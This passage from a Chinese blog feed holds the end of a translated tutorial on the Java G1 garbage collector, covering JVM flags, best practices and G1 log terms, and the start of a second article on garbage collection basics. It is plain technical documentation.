<h3 id="老年代GC总结"><a href="#老年代GC总结" class="headerlink" title="老年代GC总结"></a>老年代GC总结</h3><p>综上所述，关于老年代的 G1 垃圾回收，我们可以提出几个关键点。</p>
<ul>
<li>并发标记阶段</li>
</ul>
<ol>
<li>在应用程序运行时同时计算活跃度信息。</li>
<li>该活跃度信息确定了在撤离暂停期间哪些区域最适合回收。</li>
<li>没有像 CMS 那样的清扫阶段。</li>
</ol>
<ul>
<li>重新标记阶段</li>
</ul>
<ol>
<li>使用 Snapshot-at-the-Beginning (SATB) 算法，该算法比 CMS 使用的要快得多。</li>
<li>完全空的区域被回收。</li>
</ol>
<ul>
<li>复制/清理阶段</li>
</ul>
<ol>
<li>年轻代和老年代同时回收。</li>
<li>老年代区域是根据它们的活跃度来选择的。</li>
</ol>
<h1 id="命令行选项和最佳实践"><a href="#命令行选项和最佳实践" class="headerlink" title="命令行选项和最佳实践"></a>命令行选项和最佳实践</h1><p>在本节中，让我们看一下 G1 的各种命令行选项。</p>
<h2 id="基本命令行"><a href="#基本命令行" class="headerlink" title="基本命令行"></a>基本命令行</h2><p>要启用 G1 收集器，请使用：<code>-XX:+UseG1GC</code></p>
<p>以下是用于启动 JDK 演示和示例下载中包含的 Java2Demo 的示例命令行：<br><code>java -Xmx50m -Xms50m -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -jar c:\javademos\demo\jfc\Java2D\Java2demo.jar</code></p>
<h2 id="关键命令行开关"><a href="#关键命令行开关" class="headerlink" title="关键命令行开关"></a>关键命令行开关</h2><p><code>-XX:+UseG1GC</code> - 告诉 JVM 使用 G1 垃圾收集器。</p>
<p><code>-XX:MaxGCPauseMillis=200</code> - 设置最大 GC 暂停时间的目标。这是一个软目标，JVM 将尽最大努力实现它。因此，暂停时间目标有时无法实现。默认值为 200 毫秒。</p>
<p><code>-XX:InitiatingHeapOccupancyPercent=45</code> - 启动并发 GC 周期的（整个）堆占用百分比。 G1 使用它来触发基于整个堆的占用情况的并发 GC 周期，而不仅仅是一代。值 0 表示“执行恒定的 GC 循环”。默认值为 45（即 45% 已满或已占用）。</p>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>在使用 G1 时，您应该遵循一些最佳实践。</p>
<h4 id="不要设置年轻代大小"><a href="#不要设置年轻代大小" class="headerlink" title="不要设置年轻代大小"></a>不要设置年轻代大小</h4><p>通过 -Xmn 显式设置年轻代大小会影响 G1 收集器的默认行为。</p>
<ul>
<li>G1 将不再遵守集合的暂停时间目标。所以本质上，设置年轻代大小会禁用暂停时间目标。</li>
<li>G1 不再能够根据需要扩展和收缩年轻代空间。由于大小是固定的，因此无法更改大小。</li>
</ul>
<h4 id="响应时间指标"><a href="#响应时间指标" class="headerlink" title="响应时间指标"></a>响应时间指标</h4><p>不要使用平均响应时间 (ART) 作为设置 XX:MaxGCPauseMillis=<n> 的指标，而是考虑设置将在 90% 或更多时间内满足目标的值。这意味着 90% 的发出请求的用户不会遇到高于目标的响应时间。请记住，暂停时间是一个目标，不能保证总是能达到。</n></p>
<h4 id="什么是疏散失败？"><a href="#什么是疏散失败？" class="headerlink" title="什么是疏散失败？"></a>什么是疏散失败？</h4><p>当 JVM 在 GC 期间为幸存者和提升对象用完堆区域时发生提升失败。堆无法扩展，因为它已经达到最大值。这在使用 -XX:+PrintGCDetails 时通过 to-space 溢出在 GC 日志中指示。这很贵！</p>
<ul>
<li>GC 仍然必须继续，因此必须释放空间。</li>
<li>未成功复制的对象必须在适当的位置进行永久保存。</li>
<li>必须重新生成对 CSet 中区域 RSet 的任何更新。</li>
<li>所有这些步骤都是昂贵的。</li>
</ul>
<h4 id="如何避免疏散失败"><a href="#如何避免疏散失败" class="headerlink" title="如何避免疏散失败"></a>如何避免疏散失败</h4><p>为避免疏散失败，请考虑以下选项。</p>
<ul>
<li>增加堆大小</li>
</ul>
<ol>
<li>增加-XX:G1ReservePercent=n，默认为10。</li>
<li>G1 通过尝试让保留内存空闲以防需要更多“to-space”来创建假天花板。</li>
</ol>
<ul>
<li>提前开始标记周期</li>
<li>使用 -XX:ConcGCThreads=n 选项增加标记线程的数量。</li>
</ul>
<h3 id="G1-GC-开关的完整列表"><a href="#G1-GC-开关的完整列表" class="headerlink" title="G1 GC 开关的完整列表"></a>G1 GC 开关的完整列表</h3><p>这是 G1 GC 开关的完整列表。请记住使用上述最佳实践。<br>| 选项和默认值 | 描述 |<br>| — | — |<br>| <code>-XX:+UseG1GC</code> | 使用垃圾优先 (G1) 收集器 |<br>| <code>-XX:MaxGCPauseMillis=n</code> | 设置最大 GC 暂停时间的目标。这是一个软目标，JVM 将尽最大努力实现它。 |<br>| <code>-XX:InitiatingHeapOccupancyPercent=n</code> | 启动并发 GC 周期的（整个）堆占用百分比。它被 GC 使用，这些 GC 根据整个堆的占用情况触发并发 GC 周期，而不仅仅是一代（例如 G1）。值 0 表示“执行恒定的 GC 循环”。默认值为 45。 |<br>| <code>-XX:NewRatio=n</code> | 新/旧代大小的比率。默认值为 2。 |<br>| <code>-XX:SurvivorRatio=n</code> | Eden/Survivor空间大小的比率。默认值为 8。 |<br>| <code>-XX:MaxTenuringThreshold=n</code> | 任期阈值的最大值。默认值为 15。 |<br>| <code>-XX:ParallelGCThreads=n</code> | 设置在垃圾收集器的并行阶段使用的线程数。默认值随运行 JVM 的平台而异。 |<br>| <code>-XX:ConcGCThreads=n</code> | 并发垃圾收集器将使用的线程数。默认值随运行 JVM 的平台而异。 |<br>| <code>-XX:G1ReservePercent=n</code> | 将保留的堆数量设置为错误上限，以减少升级失败的可能性。默认值为 10。 |<br>| <code>-XX:G1HeapRegionSize=n</code> | 在 G1 中，Java 堆被细分为大小一致的区域。这设置了各个细分的大小。此参数的默认值是根据堆大小以符合人体工程学的方式确定的。最小值为 1Mb，最大值为 32Mb。 |</p>
<h1 id="使用-G1-记录-GC"><a href="#使用-G1-记录-GC" class="headerlink" title="使用 G1 记录 GC"></a>使用 G1 记录 GC</h1><p>我们需要讨论的最后一个主题是使用日志信息来分析 G1 收集器的性能。本节简要概述了可用于收集数据的开关以及打印在日志中的信息。</p>
<h2 id="设置日志详细信息"><a href="#设置日志详细信息" class="headerlink" title="设置日志详细信息"></a>设置日志详细信息</h2><p>您可以将详细信息设置为三个不同的详细信息级别。</p>
<p>(1) -verbosegc（相当于-XX:+PrintGC）将日志的详细级别设置为fine。<br><strong>样本输出</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[GC pause (G1 Humongous Allocation) (young) (initial-mark) 24M- &gt;21M(64M), 0.2349730 secs]</span><br><span class="line">[GC pause (G1 Evacuation Pause) (mixed) 66M-&gt;21M(236M), 0.1625268 secs]</span><br></pre></td></tr></table></figure></p>
<p>(2) -XX:+PrintGCDetails 设置细节级别finer。选项显示以下信息：</p>
<ul>
<li>显示每个阶段的平均、最小和最大时间。</li>
<li>根扫描、RSet 更新（带有已处理的缓冲区信息）、RSet 扫描、对象复制、终止（带有尝试次数）。</li>
<li>还显示“其他”时间，例如选择 CSet、引用处理、引用入队和释放 CSet 所花费的时间。</li>
<li>显示 Eden、Survivors 和 Total Heap 占用。</li>
</ul>
<p><strong>样本输出</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Ext Root Scanning (ms): Avg: 1.7 Min: 0.0 Max: 3.7 Diff: 3.7]</span><br><span class="line">[Eden: 818M(818M)-&gt;0B(714M) Survivors: 0B-&gt;104M Heap: 836M(4096M)-&gt;409M(4096M)]</span><br></pre></td></tr></table></figure></p>
<p>(3) -XX:+UnlockExperimentalVMOptions -XX:G1LogLevel=finest 将细节级别设置为finest。像finer，但包括单独的工作线程信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Ext Root Scanning (ms): 2.1 2.4 2.0 0.0</span><br><span class="line">           Avg: 1.6 Min: 0.0 Max: 2.4 Diff: 2.3]</span><br><span class="line">       [Update RS (ms):  0.4  0.2  0.4  0.0</span><br><span class="line">           Avg: 0.2 Min: 0.0 Max: 0.4 Diff: 0.4]</span><br><span class="line">           [Processed Buffers : 5 1 10 0</span><br><span class="line">           Sum: 16, Avg: 4, Min: 0, Max: 10, Diff: 10]</span><br></pre></td></tr></table></figure></p>
<h2 id="确定时间"><a href="#确定时间" class="headerlink" title="确定时间"></a>确定时间</h2><p>几个开关决定了时间在 GC 日志中的显示方式。<br>(1) -XX:+PrintGCTimeStamps - 显示自 JVM 启动以来经过的时间。<br><strong>样本输出</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.729: [GC pause (young) 46M-&gt;35M(1332M), 0.0310029 secs]</span><br></pre></td></tr></table></figure></p>
<p>(2) -XX:+PrintGCDateStamps - 为每个条目添加时间前缀。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2012-05-02T11:16:32.057+0200: [GC pause (young) 46M-&gt;35M(1332M), 0.0317225 secs]</span><br></pre></td></tr></table></figure></p>
<h2 id="了解-G1-日志"><a href="#了解-G1-日志" class="headerlink" title="了解 G1 日志"></a>了解 G1 日志</h2><p>为了理解日志，本节定义了一些使用实际 GC 日志输出的术语。以下示例显示了日志的输出以及您将在其中找到的术语和值的解释。</p>
<h2 id="G1-记录术语索引"><a href="#G1-记录术语索引" class="headerlink" title="G1 记录术语索引"></a>G1 记录术语索引</h2><p>Clear CT<br>CSet<br>External Root Scanning<br>Free CSet<br>GC Worker End<br>GC Worker Other<br>Object Copy<br>Other<br>Parallel Time<br>Ref Eng<br>Ref Proc<br>Scanning Remembered Sets<br>Termination Time<br>Update Remembered Set<br>Worker Start</p>
<p><strong>Parallel Time</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">414.557: [GC pause (young), 0.03039600 secs] [Parallel Time: 22.9 ms]</span><br><span class="line">[GC Worker Start (ms): 7096.0 7096.0 7096.1 7096.1 706.1 7096.1 7096.1 7096.1 7096.2 7096.2 7096.2 7096.2</span><br><span class="line">       Avg: 7096.1, Min: 7096.0, Max: 7096.2, Diff: 0.2]</span><br><span class="line"></span><br><span class="line">Parallel Time – 暂停的主要并行部分的总经过时间</span><br><span class="line">Worker Start – 工作开始的时间戳</span><br><span class="line">注意：日志按线程 id 排序，并且在每个条目上都是一致的</span><br></pre></td></tr></table></figure></p>
<p><strong>External Root Scanning</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Ext Root Scanning (ms): 3.1 3.4 3.4 3.0 4.2 2.0 3.6 3.2 3.4 7.7 3.7 4.4</span><br><span class="line">     Avg: 3.8, Min: 2.0, Max: 7.7, Diff: 5.7]</span><br><span class="line"></span><br><span class="line">External root scanning - 扫描外部根所花费的时间（例如，指向堆的系统字典之类的东西。）</span><br></pre></td></tr></table></figure></p>
<p><strong>Update Remembered Set</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Update RS (ms): 0.1 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 Avg: 0.0, Min: 0.0, Max: 0.1, Diff: 0.1]</span><br><span class="line">   [Processed Buffers : 26 0 0 0 0 0 0 0 0 0 0 0</span><br><span class="line">    Sum: 26, Avg: 2, Min: 0, Max: 26, Diff: 26]</span><br><span class="line">Update Remembered Set - 必须更新在暂停开始之前已完成但尚未由并发细化线程处理的任何缓冲区。时间取决于卡片的密度。卡越多，需要的时间就越长。</span><br></pre></td></tr></table></figure></p>
<p><strong>Scanning Remembered Sets</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Scan RS (ms): 0.4 0.2 0.1 0.3 0.0 0.0 0.1 0.2 0.0 0.1 0.0 0.0 Avg: 0.1, Min: 0.0, Max: 0.4, Diff: 0.3]F</span><br><span class="line"></span><br><span class="line">Scanning Remembered Sets - 寻找指向集合集的指针。</span><br></pre></td></tr></table></figure></p>
<p><strong>Object Copy</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Object Copy (ms): 16.7 16.7 16.7 16.9 16.0 18.1 16.5 16.8 16.7 12.3 16.4 15.7 Avg: 16.3, Min: 12.3, Max:  18.1, Diff: 5.8]</span><br><span class="line">Object copy – 每个单独线程花费在复制和撤离对象的时间。</span><br></pre></td></tr></table></figure></p>
<p><strong>Termination Time</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Termination (ms): 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0</span><br><span class="line">0.0 Avg: 0.0, Min: 0.0, Max: 0.0, Diff: 0.0] [Termination Attempts : 1 1 1 1 1 1 1 1 1 1 1 1 Sum: 12, Avg: 1, Min: 1, Max: 1, Diff: 0]</span><br><span class="line"></span><br><span class="line">Termination time - 当工作线程完成其要复制和扫描的特定对象集时，它进入终止协议。它寻找要窃取的工作，一旦完成该工作，它就会再次进入终止协议。终止尝试计算所有窃取工作的尝试。</span><br></pre></td></tr></table></figure></p>
<p><strong>GC Worker End</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[GC Worker End (ms): 7116.4 7116.3 7116.4 7116.3 7116.4 7116.3 7116.4 7116.4 7116.4 7116.4 7116.3 7116.3</span><br><span class="line">    Avg: 7116.4, Min: 7116.3, Max: 7116.4, Diff:   0.1]</span><br><span class="line">[GC Worker (ms): 20.4 20.3 20.3 20.2 20.3 20.2 20.2 20.2 20.3 20.2 20.1 20.1</span><br><span class="line">     Avg: 20.2, Min: 20.1, Max: 20.4, Diff: 0.3]</span><br><span class="line"></span><br><span class="line">GC worker end time – 单个 GC 工作停止时的时间戳。</span><br><span class="line">GC worker time – 单个 GC 工作线程花费的时间。</span><br></pre></td></tr></table></figure></p>
<p><strong>GC Worker Other</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[GC Worker Other (ms): 2.6 2.6 2.7 2.7 2.7 2.7 2.7 2.8 2.8 2.8 2.8 2.8</span><br><span class="line">    Avg: 2.7, Min: 2.6, Max: 2.8, Diff: 0.2]</span><br><span class="line"></span><br><span class="line">GC worker other – 不能归因于前面列出的工作阶段的时间（对于每个 GC 线程）。应该很低。过去，我们看到过高的值，它们被归因于 JVM 其他部分的瓶颈（例如，分层代码缓存占用率增加）。</span><br></pre></td></tr></table></figure></p>
<p><strong>Clear CT</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Clear CT: 0.6 ms]</span><br><span class="line"></span><br><span class="line">清除RSet扫描元数据卡表所用时间</span><br></pre></td></tr></table></figure></p>
<p><strong>Other</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Other: 6.8 ms]</span><br><span class="line"></span><br><span class="line">GC 暂停的各种其他顺序阶段所花费的时间。</span><br></pre></td></tr></table></figure></p>
<p><strong>CSet</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Choose CSet: 0.1 ms]</span><br><span class="line"></span><br><span class="line">最终确定要收集的区域集所花费的时间。通常非常小；必须选择旧时稍长。</span><br></pre></td></tr></table></figure></p>
<p><strong>Ref Proc</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ref Proc: 4.4 ms]</span><br><span class="line"></span><br><span class="line">处理从 GC 的先前阶段推迟的软、弱等引用所花费的时间。</span><br></pre></td></tr></table></figure></p>
<p><strong>Ref Enq</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ref Enq: 0.1 ms]</span><br><span class="line"></span><br><span class="line">将软、弱等引用放入待处理列表所花费的时间。</span><br></pre></td></tr></table></figure></p>
<p><strong>Free CSet</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Free CSet: 2.0 ms]</span><br><span class="line"></span><br><span class="line">释放刚刚收集的区域集（包括它们的记忆集）所花费的时间。</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在本 OBE 中，您将了解 Java JVM 中包含的 G1 垃圾收集器的概述。首先，您了解了堆和垃圾收集器如何成为任何 Java JVM 的关键部分。接下来你回顾了垃圾收集是如何使用 CMS 收集器和 G1 收集器工作的。接下来，您了解了 G1 命令行开关以及使用它们的最佳实践。最后，您了解了 GC 日志中包含的日志记录对象和数据。</p>
<p>在本教程中，您学习了：</p>
<ul>
<li>Java JVM 的组件</li>
<li>G1 收集器概述</li>
<li>CMS 收集器的回顾</li>
<li>G1 收集器的查看</li>
<li>命令行开关和最佳实践</li>
<li>使用 G1 日志</li>
</ul>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> gc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java垃圾收集基础]]></title>
      <url>/2022/java-gc01/</url>
      <content type="html"><![CDATA[<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本教程介绍垃圾收集如何与 Hotspot JVM 配合使用的基础知识。了解垃圾收集器的功能后，了解如何使用 Visual VM 监控垃圾收集过程。最后，了解 Java SE 7 Hotspot JVM 中可用的垃圾收集器。<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本 OBE 涵盖了 Java 中的 Java 虚拟机 (JVM) 垃圾收集 (GC) 的基础知识。在 OBE 的第一部分中，提供了 JVM 的概述以及垃圾收集和性能的介绍。接下来的学生将获得关于垃圾收集如何在 JVM 中工作的分步指南。接下来为学习者提供了一个动手活动，以试用 Java JDK 中提供的一些监控工具，并将他们刚刚学到的关于垃圾收集的知识付诸实践。最后，提供了一节介绍 Hotspot JVM 中可用的垃圾收集方案选项。</p>
<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
<li>JDK7 <a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank" rel="noopener">jdk7</a></li>
</ul>
<h1 id="Java技术与JVM"><a href="#Java技术与JVM" class="headerlink" title="Java技术与JVM"></a>Java技术与JVM</h1><h2 id="Java概览"><a href="#Java概览" class="headerlink" title="Java概览"></a>Java概览</h2><p>Java 是 Sun Microsystems 于 1995 年首次发布的一种编程语言和计算平台。它是支持 Java 程序（包括实用程序、游戏和业务应用程序）的底层技术。 Java 在全球超过 8.5 亿台个人计算机和全球数十亿台设备上运行，包括移动设备和电视设备。 Java 由许多关键组件组成，它们作为一个整体创建了 Java 平台</p>
<h2 id="JRE-Java-Runtime-Edition"><a href="#JRE-Java-Runtime-Edition" class="headerlink" title="JRE (Java Runtime Edition)"></a>JRE (Java Runtime Edition)</h2><p>下载 Java 时，您将获得 Java 运行时环境 (JRE)。 JRE 由 Java 虚拟机 (JVM)、Java 平台核心类和支持 Java 平台库组成。这三个都是在您的计算机上运行 Java 应用程序所必需的。在 Java 7 中，Java 应用程序作为操作系统中的桌面应用程序运行，作为桌面应用程序运行，但使用 Java Web Start 从 Web 安装，或者作为浏览器中的 Web 嵌入式应用程序（使用 JavaFX）运行。</p>
<h2 id="Java编程语言-Java-Programming-Language"><a href="#Java编程语言-Java-Programming-Language" class="headerlink" title="Java编程语言 (Java Programming Language)"></a>Java编程语言 (Java Programming Language)</h2><p>Java 是一种面向对象的编程语言，包括以下特性。</p>
<ul>
<li>平台独立性——Java 应用程序被编译成字节码，存储在class文件中并加载到 JVM 中。由于应用程序在 JVM 中运行，因此它们可以在许多不同的操作系统和设备上运行。</li>
<li>面向对象——Java 是一种面向对象的语言，它采用了 C 和 C++ 的许多特性并对其进行了改进。</li>
<li>自动垃圾收集 - Java 自动分配和释放内存，因此程序不会承担该任务。</li>
<li>丰富的标准库 - Java 包含大量可用于执行诸如输入/输出、网络和日期操作等任务的预制对象。</li>
</ul>
<h2 id="JDK-Java-Development-Kit"><a href="#JDK-Java-Development-Kit" class="headerlink" title="JDK (Java Development Kit)"></a>JDK (Java Development Kit)</h2><p>Java Development Kit (JDK) 是一组用于开发 Java 应用程序的工具。使用 JDK，您可以编译用 Java 编程语言编写的程序并在 JVM 中运行它们。此外，JDK 提供了用于打包和分发应用程序的工具。</p>
<p>JDK 和 JRE 共享 Java 应用程序编程接口 (Java API)。 Java API 是开发人员用来创建 Java 应用程序的预打包库的集合。 Java API 通过提供工具来完成许多常见的编程任务，包括字符串操作、日期/时间处理、网络和实现数据结构（例如，列表、映射、堆栈和队列），从而使开发更容易。</p>
<h2 id="JAVA虚拟机-Java-Virtual-Machine"><a href="#JAVA虚拟机-Java-Virtual-Machine" class="headerlink" title="JAVA虚拟机(Java Virtual Machine)"></a>JAVA虚拟机(Java Virtual Machine)</h2><p>Java 虚拟机 (JVM) 是一种抽象计算机。 JVM 是一个程序，对于编写在其中执行的程序来说，它看起来就像一台机器。通过这种方式，Java 程序被写入同一组接口和库。特定操作系统的每个 JVM 实现都将 Java 编程指令转换为在本地操作系统上运行的指令和命令。这样，Java 程序就实现了平台独立性。</p>
<p>Java 虚拟机的第一个原型实现由 Sun Microsystems, Inc. 完成，它在类似于当代个人数字助理 (PDA) 的手持设备托管的软件中模拟 Java 虚拟机指令集。 Oracle 当前的实现在移动、桌面和服务器设备上模拟 Java 虚拟机，但 Java 虚拟机不采用任何特定的实现技术、主机硬件或主机操作系统。它本身不是解释的，但也可以通过将其指令集编译为硅 CPU 的指令集来实现。它也可以用微码或直接用硅实现。</p>
<p>Java 虚拟机对 Java 编程语言一无所知，只知道一种特定的二进制格式，即class文件格式。class文件包含 Java 虚拟机指令（或字节码）和符号表，以及其他辅助信息。</p>
<p>为了安全起见，Java 虚拟机对类文件中的代码施加了强大的句法和结构约束。但是，任何具有可以用有效类文件表示的功能的语言都可以由 Java 虚拟机托管。被一个普遍可用的、独立于机器的平台所吸引，其他语言的实现者可以将 Java 虚拟机作为他们语言的交付工具。</p>
<h1 id="探索JVM架构"><a href="#探索JVM架构" class="headerlink" title="探索JVM架构"></a>探索JVM架构</h1><h2 id="Hotspot-架构"><a href="#Hotspot-架构" class="headerlink" title="Hotspot 架构"></a>Hotspot 架构</h2><p>HotSpot JVM 的架构支持强大的特性和能力基础，并支持实现高性能和大规模可扩展性的能力。例如，HotSpot JVM JIT 编译器生成动态优化。换句话说，它们在 Java 应用程序运行时做出优化决策，并生成针对底层系统架构的高性能本机机器指令。此外，通过其运行时环境和多线程垃圾收集器的成熟演变和持续工程，HotSpot JVM 即使在最大的可用计算机系统上也能产生高可扩展性。<br><img src="https://img-blog.csdnimg.cn/img_convert/981d16663b2f9adfab10c60da32948d5.png" alt="HotSpot 架构"><br>JVM 的主要组件包括类加载器、运行时数据区和执行引擎。</p>
<h2 id="关键Hotspot组件"><a href="#关键Hotspot组件" class="headerlink" title="关键Hotspot组件"></a>关键Hotspot组件</h2><p>下图中突出显示了与性能相关的 JVM 关键组件。<br><img src="https://img-blog.csdnimg.cn/img_convert/981d16663b2f9adfab10c60da32948d5.png" alt="image.png"></p>
<p>JVM 的三个组件在调优性能时需要重点关注。堆是存储对象数据的地方。然后，该区域由启动时选择的垃圾收集器管理。大多数调整选项都与堆大小和为您的情况选择最合适的垃圾收集器有关。 JIT 编译器对性能也有很大影响，但很少需要使用较新版本的 JVM 进行调整。</p>
<h1 id="性能基础"><a href="#性能基础" class="headerlink" title="性能基础"></a>性能基础</h1><p>通常，在调整 Java 应用程序时，重点是两个主要目标之一：响应性或吞吐量。随着教程的进行，我们将参考这些概念。</p>
<h2 id="响应能力-Responsiveness"><a href="#响应能力-Responsiveness" class="headerlink" title="响应能力 (Responsiveness)"></a>响应能力 (Responsiveness)</h2><p>响应性是指应用程序或系统响应请求的数据的速度。示例包括：</p>
<ul>
<li>桌面 UI 响应事件的速度</li>
<li>网站返回页面的速度</li>
<li>返回数据库查询的速度</li>
</ul>
<p>对于专注于响应能力的应用程序，大的暂停时间是不可接受的。重点是在短时间内做出反应</p>
<h2 id="吞吐量-Throughput"><a href="#吞吐量-Throughput" class="headerlink" title="吞吐量 (Throughput)"></a>吞吐量 (Throughput)</h2><p>吞吐量侧重于在特定时间段内最大化应用程序的工作量。如何衡量吞吐量的示例包括：</p>
<ul>
<li>在给定时间内完成的事务数。</li>
<li>批处理程序在一小时内可以完成的作业数。</li>
<li>一个小时内可以完成的数据库查询数。</li>
</ul>
<p>对于专注于吞吐量的应用程序来说，较长的暂停时间是可以接受的。由于高吞吐量应用程序在较长时间内专注于基准测试，因此无需考虑快速响应时间。</p>
<h1 id="描述垃圾收集"><a href="#描述垃圾收集" class="headerlink" title="描述垃圾收集"></a>描述垃圾收集</h1><h2 id="什么是自动垃圾收集？"><a href="#什么是自动垃圾收集？" class="headerlink" title="什么是自动垃圾收集？"></a>什么是自动垃圾收集？</h2><p>自动垃圾回收是查看堆内存，识别哪些对象正在使用，哪些没有，并删除未使用的对象的过程。使用中的对象或引用的对象意味着程序的某些部分仍然维护指向该对象的指针。程序的任何部分都不再引用未使用的对象或未引用的对象。因此可以回收未引用对象使用的内存。</p>
<p>在像 C 这样的编程语言中，分配和释放内存是一个手动过程。在 Java 中，释放内存的过程由垃圾收集器自动处理。基本过程可以描述如下。</p>
<h3 id="第-1-步：标记"><a href="#第-1-步：标记" class="headerlink" title="第 1 步：标记"></a>第 1 步：标记</h3><p>该过程的第一步称为标记。这是垃圾收集器识别哪些内存正在使用，哪些没有使用的地方。<br><img src="https://img-blog.csdnimg.cn/img_convert/deca5128353d7f008d580c084be55768.png" alt="Marking"></p>
<p>引用的对象以蓝色显示。未引用的对象以金色显示。在标记阶段扫描所有对象以做出此决定。如果必须扫描系统中的所有对象，这可能是一个非常耗时的过程。</p>
<h3 id="第-2-步：正常删除"><a href="#第-2-步：正常删除" class="headerlink" title="第 2 步：正常删除"></a>第 2 步：正常删除</h3><p>正常删除删除未引用的对象，留下引用的对象和指向可用空间的指针。<br><img src="https://img-blog.csdnimg.cn/img_convert/8b5db23985e26206b82188f497e05fa8.png" alt="Normal Deletion"></p>
<p>内存分配器保存对可以分配新对象的可用空间块的引用。</p>
<h3 id="步骤-2a：使用压缩删除"><a href="#步骤-2a：使用压缩删除" class="headerlink" title="步骤 2a：使用压缩删除"></a>步骤 2a：使用压缩删除</h3><p>为了进一步提高性能，除了删除未引用的对象外，还可以压缩剩余的引用对象。通过将引用的对象一起移动，这使得新的内存分配更加容易和快捷。<br><img src="https://img-blog.csdnimg.cn/img_convert/0a8bd96736e5a74f3ea2dbc685023644.png" alt="Deletion with Compacting"></p>
<h4 id="为什么要进行分代垃圾收集？"><a href="#为什么要进行分代垃圾收集？" class="headerlink" title="为什么要进行分代垃圾收集？"></a>为什么要进行分代垃圾收集？</h4><p>如前所述，必须标记和压缩 JVM 中的所有对象是低效的。随着越来越多的对象被分配，对象列表越来越多，导致垃圾收集时间越来越长。然而，应用的经验分析表明，大多数对象都是短暂的。</p>
<p>这是此类数据的示例。 Y 轴显示分配的字节数，X 访问显示随时间分配的字节数。<br><img src="https://img-blog.csdnimg.cn/img_convert/b9d1e27dd5e1d3cc9866fd99f5cb1927.png" alt="Byte allocated"></p>
<p>如您所见，随着时间的推移，分配的对象越来越少。事实上，大多数对象的寿命都很短，如图左侧的较高值所示。</p>
<h2 id="JVM堆分代"><a href="#JVM堆分代" class="headerlink" title="JVM堆分代"></a>JVM堆分代</h2><p>从对象分配行为中学到的信息可以用来增强 JVM 的性能。因此，堆被分解成更小的部分或代。堆部分是：年轻代(Young Generation), 老年代(Old or Tenured Generation), 和永久代(Permanent Generation)<br><img src="https://img-blog.csdnimg.cn/img_convert/3b33b1a38ccf56fae53eacb76e58ea97.png" alt="Hotspot Heap Structure"></p>
